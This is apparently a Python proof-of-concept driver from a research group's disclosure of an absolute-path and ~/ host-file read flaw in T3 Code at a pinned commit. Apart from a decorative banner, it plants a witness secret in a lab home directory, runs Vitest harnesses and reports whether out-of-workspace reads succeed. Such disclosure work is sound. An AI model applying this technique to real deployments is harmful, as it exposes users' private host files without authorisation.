#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: t3code-abspath-host-read (Medium: 6.5)
#  Vendor: T3 Code (Ping)
#  Versions: T3 Code 61c3794c
#  Impact: paired filesystem:read client reads host files by absolute or ~/ path
#  Requires: Node 26, pnpm 12, loopback Vitest clone of pingdotgg/t3code at 61c3794c
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "t3code-abspath-host-read"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Prove T3 Code F-01 unconfined abs/~/ WorkspaceFileSystem.readFile on the pin."""


import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

LABEL = "T3-F01-ABSPATH"
WITNESS = "t3f01w8k2"
PIN = "61c3794c32b0eeebfac09add43e403618c65d2d7"
PIN_SHORT = "61c3794c"
HERE = Path(__file__).resolve().parent
SRC = HERE / "src"
LAB_HOME = HERE / "lab-home"
WORKSPACE = HERE / "workspace"
SECRET = LAB_HOME / ".lab-secret"
DECOY = WORKSPACE / "~" / ".lab-secret"
HARNESS_SRC = HERE / "harness.test.ts"
HARNESS_DST = SRC / "apps" / "server" / "src" / "workspace" / "f01-abspath.lab.test.ts"
RESULT_PATH = HERE / "harness-result.json"
PINNED_TEST = (
    SRC / "apps" / "server" / "src" / "workspace" / "WorkspaceFileSystem.test.ts"
)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def succeed() -> int:
    log(f"SUCCESS {LABEL} {WITNESS}")
    return 0


def write_text(path: Path, contents: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(contents, encoding="utf-8")


def plant() -> None:
    if LAB_HOME.exists():
        shutil.rmtree(LAB_HOME)
    if WORKSPACE.exists():
        shutil.rmtree(WORKSPACE)
    LAB_HOME.mkdir(parents=True)
    WORKSPACE.mkdir(parents=True)
    write_text(SECRET, f"{WITNESS}\n")
    os.chmod(SECRET, 0o600)
    write_text(DECOY, "Workspace decoy\n")
    write_text(WORKSPACE / "inside.txt", "workspace-ok\n")
    SECRET.chmod(0o600)


def confirm_pin() -> str | None:
    if not (SRC / ".git").exists() and not (SRC / ".git").is_file():
        return "missing-worktree"
    got = subprocess.run(
        ["git", "-C", str(SRC), "rev-parse", "HEAD"],
        check=False,
        capture_output=True,
        text=True,
    )
    if got.returncode != 0:
        return "git-rev-parse"
    sha = got.stdout.strip()
    if sha != PIN:
        return f"pin-mismatch-{sha[:12]}"
    return None


def vp_bin() -> Path | None:
    candidates = [
        SRC / "apps" / "server" / "node_modules" / ".bin" / "vp",
        SRC / "node_modules" / ".bin" / "vp",
        HERE / ".tools" / "node_modules" / ".bin" / "vp",
    ]
    for path in candidates:
        if path.is_file():
            return path
    which = shutil.which("vp")
    return Path(which) if which else None


def run_vp(args: list[str], env: dict[str, str], timeout_s: int) -> subprocess.CompletedProcess[str]:
    vp = vp_bin()
    if vp is None:
        raise FileNotFoundError("vp")
    return subprocess.run(
        [str(vp), *args],
        cwd=str(SRC / "apps" / "server"),
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=timeout_s,
    )


def lab_env() -> dict[str, str]:
    env = os.environ.copy()
    env["HOME"] = str(LAB_HOME)
    env["T3CODE_HOME"] = str(LAB_HOME)
    env["TMPDIR"] = str(HERE / "tmp")
    env["LAB_HOME"] = str(LAB_HOME)
    env["LAB_WORKSPACE"] = str(WORKSPACE)
    env["LAB_SECRET_PATH"] = str(SECRET)
    env["LAB_WITNESS"] = WITNESS
    env["LAB_RESULT_PATH"] = str(RESULT_PATH)
    env["CI"] = "1"
    (HERE / "tmp").mkdir(parents=True, exist_ok=True)
    return env


def copy_harness() -> None:
    HARNESS_DST.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(HARNESS_SRC, HARNESS_DST)


def load_result() -> dict[str, Any] | None:
    if not RESULT_PATH.is_file():
        return None
    raw = RESULT_PATH.read_text(encoding="utf-8").strip()
    if not raw:
        return None
    data = json.loads(raw)
    return data if isinstance(data, dict) else None


def as_flag(value: Any) -> int:
    if value in (1, "1", True):
        return 1
    return 0


def main() -> int:
    pin_err = confirm_pin()
    if pin_err:
        return fail(pin_err)
    if not PINNED_TEST.is_file():
        return fail("missing-workspace-test")
    if not HARNESS_SRC.is_file():
        return fail("missing-harness")
    if vp_bin() is None:
        return fail("install-failed")

    plant()
    if HERE.resolve() not in SECRET.resolve().parents:
        return fail("secret-outside-lab")
    copy_harness()
    if RESULT_PATH.exists():
        RESULT_PATH.unlink()

    env = lab_env()
    try:
        existing = run_vp(
            [
                "test",
                "run",
                "src/workspace/WorkspaceFileSystem.test.ts",
                "-t",
                "reads host files outside the workspace root by absolute path|reads ~/ paths from the server home outside the workspace|rejects writes by absolute path",
            ],
            env,
            timeout_s=180,
        )
    except subprocess.TimeoutExpired:
        return fail("existing-tests-timeout")
    except FileNotFoundError:
        return fail("install-failed")

    log(f"IOC existing-tests-exit={existing.returncode}")
    if existing.stdout:
        log(existing.stdout[-4000:])
    if existing.returncode != 0:
        if existing.stderr:
            log(existing.stderr[-4000:])
        return fail("existing-tests-failed")

    try:
        lab = run_vp(
            ["test", "run", "src/workspace/f01-abspath.lab.test.ts"],
            env,
            timeout_s=180,
        )
    except subprocess.TimeoutExpired:
        return fail("harness-timeout")

    log(f"IOC harness-exit={lab.returncode}")
    if lab.stdout:
        log(lab.stdout[-4000:])
    if lab.returncode != 0 and lab.stderr:
        log(lab.stderr[-4000:])

    data = load_result()
    if data is None:
        return fail("harness-no-result")

    abs_read = as_flag(data.get("absRead"))
    home_read = as_flag(data.get("homeRead"))
    rel_escape = as_flag(data.get("relEscape"))
    write_abs = str(data.get("writeAbs") or "unexpected")
    mcp = str(data.get("mcpReadonlyFilesystem") or "skipped")
    secret_unchanged = bool(data.get("secretUnchanged"))
    used_operator_home = bool(data.get("usedOperatorHome"))

    log(f"IOC pin={PIN_SHORT}")
    log(f"IOC abs-read={abs_read}")
    log(f"IOC home-read={home_read}")
    log(f"IOC rel-escape={rel_escape}")
    log(f"IOC write-abs={write_abs}")
    log(f"IOC mcp-readonly-filesystem={mcp}")
    log(f"IOC secret-unchanged={int(secret_unchanged)}")
    log(f"IOC abs-contents={str(data.get('absContents', ''))[:80]!r}")
    log(f"IOC home-contents={str(data.get('homeContents', ''))[:80]!r}")
    log(f"IOC rel-tag={data.get('relTag')}")
    log(f"IOC write-tag={data.get('writeTag')}")

    if used_operator_home:
        return fail("operator-home")
    if abs_read != 1:
        return fail("abs-read")
    if home_read != 1:
        return fail("home-read")
    if write_abs != "refused":
        return fail("write-abs")
    if not secret_unchanged:
        return fail("secret-mutated")
    if rel_escape != 0:
        return fail("rel-escape")
    if lab.returncode != 0:
        return fail("harness-failed")
    return succeed()


if __name__ == "__main__":
    raise SystemExit(main())


